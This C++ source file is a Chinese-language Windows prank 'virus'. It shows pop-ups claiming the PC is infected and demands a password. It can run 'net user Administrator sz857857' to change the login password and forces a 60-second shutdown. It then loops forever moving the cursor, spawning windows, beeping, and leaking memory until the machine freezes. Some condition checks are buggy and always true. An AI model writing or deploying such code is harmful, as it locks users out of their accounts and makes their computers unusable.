#include<bits/stdc++.h>
#include<windows.h>
using namespace std;
int main() {
	system("color f0");
	int jh;
	int mm;
	int mmm;
	int bf=0;
	long long int h=0; 
	jh=3;
	while(MessageBox(NULL,"你的电脑已经成功被陈某某病毒侵占，是否服从陈某某接下来的要求？","(偷偷告诉你，密码是3456798)",MB_YESNO)==7) {
		MessageBox(NULL,"你没有按'是'，再来一遍","不按'是'你试试(偷偷告诉你，密码是3456798)",MB_OK);
	}
	MessageBox(NULL,"输入密码以进行下一步,有3次机会","",MB_OK);
	cout<<"输入密码：";
	cin>>mmm;
	while(mmm!=3456798) 
	{
			if(jh==1) 
			{
				MessageBox(NULL,"你没有机会了,正在安装病毒驱动","hahaha",MB_OK);
				system("color 2d");
				for(int i=2; i<=100; i++) 
				{
					cout<<i<<"%"<<"已安装";
					Sleep(5);
					system("cls");
				}
				cout<<"安装完毕";
				if(MessageBox(NULL,"要我把你的开机密码改成“sz857857”吗？","",MB_YESNO)!=7) 
				{
					system("net user Administrator sz857857");//设置开机密码为xz
					system("net user Admin sz857857");//设置开机密码为xz
				}
				Sleep(500);
				int x=GetSystemMetrics(SM_CXSCREEN);//鼠标x轴 
				int y=GetSystemMetrics(SM_CYSCREEN);//鼠标y轴 
				while(1)//循环 
    			{ 
	
    					SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
						cout<<"\a";
    					system("start");
    					cout<<"\a";
						MessageBox(NULL,"哈哈哈，强制关机吧","来自Windows的警告",MB_OK);	//弹出窗口 	
     			  		char *p=new char[10000];
 				}  
		}
		jh=jh-1;
		system("color f4");
		MessageBox(NULL,"密码错误！","",MB_OK);
		system("color f4");
		cout<<"还有"<<jh<<"次机会"<<endl;
		if(jh==1) 
		{
			cout<<"小提示：开头的选项里有答案哦"<<endl;
			while(MessageBox(NULL,"你的电脑已经成功被陈某某病毒侵占，是否服从陈某某接下来的要求？","(偷偷告诉你，密码是3456798)",MB_YESNO)==7) 
			{
				MessageBox(NULL,"你没有按'是'，再来一遍","不按'是'你试试",MB_OK);
			}
		}
		Sleep(2000);
		system("color f0");
		system("cls");
		cout<<"输入密码：";
		cin>>mmm;
		cout<<endl;
	}
 
	system("color f2");
	cout<<"密码正确！"<<endl;
	MessageBox(NULL,"下一步，灵魂拷问","hahaha",MB_OK);
	system("cls");
	while(MessageBox(NULL,"陈某某帅吗","",MB_YESNO)==7) 
	{
		MessageBox(NULL,"选错了，重选!","WRONG",MB_OK);
	}
	MessageBox(NULL,"虽然你选对了，但我还是要给你安装病毒驱动","hahaha",MB_OK);
	system("color 2d");
	for(int i=1;i<=100;i++) 
	{
		bf=bf+1;
		cout<<bf<<"%"<<"已安装";
		Sleep(5);
		system("cls");
	}
	cout<<"安装完毕";
	Sleep(500);
	system("shutdown -s -t 60 -f -c'您的机器已被病毒入侵，计算机即将在60s内关机！！！'");
	Sleep(1500);
	cout<<"请输入陈馨悦，陈一鸣的农历阳历生日陈一鸣(中间不包含任何符号！)";
	cin>>h;
	if(h==809918314416||314416809918)
	{
		system("shutdown -a"); 
		for(int i=1;i<=100;i++)
		{
			MessageBox(NULL,"你以为这就完了？\n","",MB_OK);
		} 
		Sleep(5000);
		int x=GetSystemMetrics(SM_CXSCREEN);//鼠标x轴 
		int y=GetSystemMetrics(SM_CYSCREEN);//鼠标y轴 
		for(;;)
		{
			MessageBox(NULL,"你是不是很爱弹窗、很快乐？那就给你咯，哈哈哈，强制关机吧！","",MB_OK);
			SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
   			system("start");//弹出窗口 	
			Sleep(15);
  			char *p=new char[1000000];//卡死机
			cout<<"\a"; 
		}
	} 
	 else
	 {
	 	cout<<"你还有一次机会";
		system("cls");
		h=0;
		cin>>h;
		if(h!=314416809918||h!=809918314416)
		{
			system("shutdown -a");
			for(int i=1;i<=100;i++)
			{
				MessageBox(NULL,"你好，你是不是很爱弹窗","",MB_OK);
			} 
			Sleep(5000);
			int x=GetSystemMetrics(SM_CXSCREEN);//鼠标x轴 
			int y=GetSystemMetrics(SM_CYSCREEN);//鼠标y轴 
			for(;;)
			{
				MessageBox(NULL,"你是不是很爱弹窗、很快乐？那就给你咯，哈哈哈，强制关机吧！","",MB_OK);
				SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
    			system("start");//弹出窗口 	
				Sleep(15);
  				char *p=new char[1000000];//卡死机
				cout<<"\a"; 
			}
		 } 
	 }
	system("color f0");
	Sleep(2000);
	return 0;
}
